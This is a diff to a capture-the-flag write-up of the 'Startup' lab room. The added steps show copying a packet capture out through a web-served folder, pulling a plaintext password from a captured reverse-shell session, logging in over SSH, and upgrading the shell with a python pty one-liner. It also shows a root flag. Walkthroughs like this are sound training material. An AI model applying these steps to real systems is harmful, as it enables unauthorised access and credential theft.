@@ -68,16 +68,41 @@ Now that I have the shell, I got to /tmp directory and run `linpeas.sh`. This gi
 /initrd.img
 /initrd.img.old
 ```
-One of these if `recipe.txt` which gives us our first flag! i.e. secret ingridient 
+One of these if `recipe.txt` which gives us our first flag! i.e. secret ingredient which is **LOVE**.
 
+Moving on, I can only access the `/incidents` directory inside which I find a `pcapng`. So, I copy this to `/files/ftp` and download it on my local machine to analyze it with the help of Wireshark.
+```
+cp suspicious.pcapng /var/www/html/files/ftp/
+```
+Using Wireshark, I can see a lot of `tcp` streams, one of which has data on a "reverse shell", implying that this has been compromised before as well! Here, I find a password(`c4ntg3t3n0ughsp1c3`), which appear to be of the user `lennie`.
+![[Pasted image 20250823234147.png]]
 
+So, I go ahead an try to login as lennie via ssh and voila! we have the user flag!
+```
+┌──(truelyyours㉿kali)-[~/tryhackme/startup]
+└─$ ssh lennie@10.201.94.216
+lennie@10.201.94.216's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
 
-Beautify the shell a bit:
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+44 packages can be updated.
+30 updates are security updates.
+
+Last login: Sun Aug 24 01:59:17 2025 from 10.2.0.159
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+lennie@startup:~$ ls
+Documents  scripts  user.txt
+lennie@startup:~$ 
+```
+# Privilege Escalation
+
+First, let's beautify the shell a bit:
 `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
-
-# Privilege Escalation
-There seems some files in the home folder of `lennie`.
+There seems some more files in the home folder of `lennie`.
 In the `scripts` folder, we see `phanner.sh`:
 ```bash
 #!/bin/bash
@@ -123,5 +148,5 @@ THM{f963aaa6a430f210222158ae15c3d76d}
 root@startup:~# 
 ```
 
-
-``
+Congratulations 🎉😎!
+Treat yourself to a glass of crisp God's nector!
